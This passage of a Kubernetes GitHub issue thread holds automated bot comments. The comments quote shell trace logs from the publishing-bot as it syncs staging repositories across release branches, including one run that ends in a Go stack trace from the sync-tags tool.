--auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ git branch -D release-1.11\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.11\n>\tSwitching to origin/release-1.11.\n>\t+ echo 'Switching to origin/release-1.11.'\n>\t+ git branch -f release-1.11 origin/release-1.11\n>\t+ git checkout -q release-1.11\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.11\n>\t+ UPSTREAM_HASH=50ea2c8ec8368591869faf635cec41244d475cd0\n>\t+ '[' 50ea2c8ec8368591869faf635cec41244d475cd0 '!=' 50ea2c8ec8368591869faf635cec41244d475cd0 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.11 at 50ea2c8ec8368591869faf635cec41244d475cd0 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.11 at 50ea2c8ec8368591869faf635cec41244d475cd0 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.11\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.11.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.11.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-code-generator-release-1.11.sh --dependencies '' --mapping-output-file '../tag-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.11\n>\t+ '[' 8c97d6ab64da020f8b151e9d3ed8af3172f5c390 '!=' 8c97d6ab64da020f8b151e9d3ed8af3172f5c390 ']'\n>\t+ git checkout release-1.11\n>\tAlready on 'release-1.11'\n>\tYour branch is up-to-date with 'origin/release-1.11'.\n>[27 Sep 18 07:05 UTC]: Successfully constructed release-1.11\n>[27 Sep 18 07:05 UTC]: /publish_scripts/construct.sh code-generator release-1.12 release-1.12   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  0ed33881dc4355495f623c6f22e7dd0b7632b7c0\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=0ed33881dc4355495f623c6f22e7dd0b7632b7c0\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tFetching from origin.\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\t+ echo 'Fetching upstream changes.'\n>\tFetching upstream changes.\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=0ed33881dc4355495f623c6f22e7dd0b7632b7c0\n>\t+ '[' 0ed33881dc4355495f623c6f22e7dd0b7632b7c0 '!=' 0ed33881dc4355495f623c6f22e7dd0b7632b7c0 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at 0ed33881dc4355495f623c6f22e7dd0b7632b7c0 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.12 at 0ed33881dc4355495f623c6f22e7dd0b7632b7c0 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-code-generator-release-1.12.sh --dependencies '' --mapping-output-file '../tag-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at 3dcf91f64f638563e5106f21f50c31fa361c918d because \"kubernetes-1.12.0-rc.2\" seems to be relevant.\n>\tWriting source->dest hash mapping to \"../tag-kubernetes-1.12.0-rc.2-mapping\"\n>\tF0927 07:05:55.812933    4105 main.go:246] <nil>\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc44c756300, 0xc4200e6180, 0x31, 0x40)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xbc27a0, 0xc400000003, 0xc4200e6160, 0xb6927a, 0x7, 0xf6, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printDepth(0xbc27a0, 0x3, 0x1, 0xc4472079b0, 0x1, 0x1)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:646 +0x129\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).print(0xbc27a0, 0x3, 0xc4472079b0, 0x1, 0x1)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:637 +0x5a\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatal(0xc4472079b0, 0x1, 0x1)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1128 +0x53\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:246 +0x2051\n>[27 Sep 18 07:05 UTC]: exit status 255\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=code-generator\n>    \t+ SRC_BRANCH=release-1.12\n>    \t+ DST_BRANCH=release-1.12\n>    \t+ DEPS=\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/code-generator\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=false\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=0ed33881dc4355495f623c6f22e7dd0b7632b7c0\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>    \t+ git branch -D release-1.12\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/release-1.12\n>    \t+ echo 'Switching to origin/release-1.12.'\n>    \t+ git branch -f release-1.12 origin/release-1.12\n>    \t+ git checkout -q release-1.12\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/release-1.12\n>    \t+ UPSTREAM_HASH=0ed33881dc4355495f623c6f22e7dd0b7632b7c0\n>    \t+ '[' 0ed33881dc4355495f623c6f22e7dd0b7632b7c0 '!=' 0ed33881dc4355495f623c6f22e7dd0b7632b7c0 ']'\n>    \t+ echo 'Skipping sync because upstream/release-1.12 at 0ed33881dc4355495f623c6f22e7dd0b7632b7c0 did not change since last sync.'\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ LAST_BRANCH=release-1.12\n>    \t++ git rev-parse HEAD\n>    \t+ LAST_HEAD=3dcf91f64f638563e5106f21f50c31fa361c918d\n>    \t+ EXTRA_ARGS=()\n>    \t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.12.sh\n>    \t+ echo '#!/bin/bash'\n>    \t+ chmod +x ../push-tags-code-generator-release-1.12.sh\n>    \t+ '[' -z '' ']'\n>    \t++ echo kubernetes\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-code-generator-release-1.12.sh --dependencies '' --mapping-output-file '../tag-{{.Tag}}-mapping' -alsologtostderr ''\n>    \tF0927 07:05:55.812933    4105 main.go:246] <nil>\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc44c756300, 0xc4200e6180, 0x31, 0x40)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xbc27a0, 0xc400000003, 0xc4200e6160, 0xb6927a, 0x7, 0xf6, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printDepth(0xbc27a0, 0x3, 0x1, 0xc4472079b0, 0x1, 0x1)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:646 +0x129\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).print(0xbc27a0, 0x3, 0xc4472079b0, 0x1, 0x1)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:637 +0x5a\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatal(0xc4472079b0, 0x1, 0x1)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1128 +0x53\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:246 +0x2051\n>\n>[27 Sep 18 07:05 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-425412267):\n\n>/reopen\n>\n>The last publishing run failed: exit status 1\n>```\n>...tostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at c6bb70553a8287cd6451211dd366fee12e088b95 because \"kubernetes-1.12.0\" seems to be relevant.\n>\tWriting source->dest hash mapping to \"../tag-metrics-kubernetes-1.12.0-mapping\"\n>\tChecking that Godeps.json points to the actual tags in apimachinery, api, client-go.\n>\tChecking out branch tag commit 808752ba0b756827d20550294c6fc9a0e6b96287.\n>\tBumping k8s.io/api in Godeps.json from \"4b8eacabe1f1089771cbadda3440f588d439036e\" to kubernetes-1.12.0: \"0e0cd9538af802d49d76d37848058f2323c34604\".\n>\tBumping k8s.io/apimachinery in Godeps.json from \"4b8eacabe1f1089771cbadda3440f588d439036e\" to kubernetes-1.12.0: \"705814234c8085247e99946887b0fbbd801efa08\".\n>\tBumping k8s.io/client-go in Godeps.json from \"4b8eacabe1f1089771cbadda3440f588d439036e\" to kubernetes-1.12.0: \"fc239b8203672f1a8a16779c2cfd1f99844df219\".\n>\tAdding extra commit fixing dependencies to point to kubernetes-1.12.0 tags.\n>\tTagging 67b2361fab49ba4cd0c11479868daa4d651bd5ca as \"kubernetes-1.12.0\".\n>\t++ git rev-parse release-1.12\n>\t+ '[' c6bb70553a8287cd6451211dd366fee12e088b95 '!=' c6bb70553a8287cd6451211dd366fee12e088b95 ']'\n>\t+ git checkout release-1.12\n>\tPrevious HEAD position was 67b2361... Fix Godeps.json to point to kubernetes-1.12.0 tags\n>\tSwitched to branch 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[28 Sep 18 11:52 UTC]: Successfully constructed release-1.12\n>[28 Sep 18 11:52 UTC]: Successfully ensured /go-workspace/src/k8s.io/csi-api exists\n>[28 Sep 18 11:52 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[28 Sep 18 11:52 UTC]: /publish_scripts/construct.sh csi-api master master apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/csi-api kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  6b49423a8e99bb08904ac6e110e31c6a4394c024\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=csi-api\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/csi-api\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=6b49423a8e99bb08904ac6e110e31c6a4394c024\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=d204a90dcfdde3b87abd5e0b8be653409b99d190\n>\t+ '[' d204a90dcfdde3b87abd5e0b8be653409b99d190 '!=' 6b49423a8e99bb08904ac6e110e31c6a4394c024 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''6b49423a8e99bb08904ac6e110e31c6a4394c024'\\'' to '\\''d204a90dcfdde3b87abd5e0b8be653409b99d190'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from '6b49423a8e99bb08904ac6e110e31c6a4394c024' to 'd204a90dcfdde3b87abd5e0b8be653409b99d190'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api master master apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 31ae05d8096db803f5b4ff16cda6059c0a9cc861.\n>\t+ echo 'Starting at existing master commit 31ae05d8096db803f5b4ff16cda6059c0a9cc861.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit d204a90dcfdde3b87abd5e0b8be653409b99d190.\n>\t+ echo 'Checked out source commit d204a90dcfdde3b87abd5e0b8be653409b99d190.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>\t++ git-find-merge a94ea824eb59e92188f166c302d7995ba9002667 upstream/master\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'a94ea824eb59e92188f166c302d7995ba9002667^1..upstream/master' --first-parent\n>\t+++ git rev-list a94ea824eb59e92188f166c302d7995ba9002667..upstream/master --ancestry-path\n>\t+++ git rev-parse a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ local k_base_merge=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>\t+ git branch -f filtered-branch-base a94ea824eb59e92188f166c302d7995ba9002667\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\tRunning git filter-branch ...\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=935cc6b5b5d523aded922f72b39488769d3f431d\n>\t++ git log --first-parent --format=%H --reverse 935cc6b5b5d523aded922f72b39488769d3f431d..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 31ae05d8096db803f5b4ff16cda6059c0a9cc861 '!=' 31ae05d8096db803f5b4ff16cda6059c0a9cc861 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename 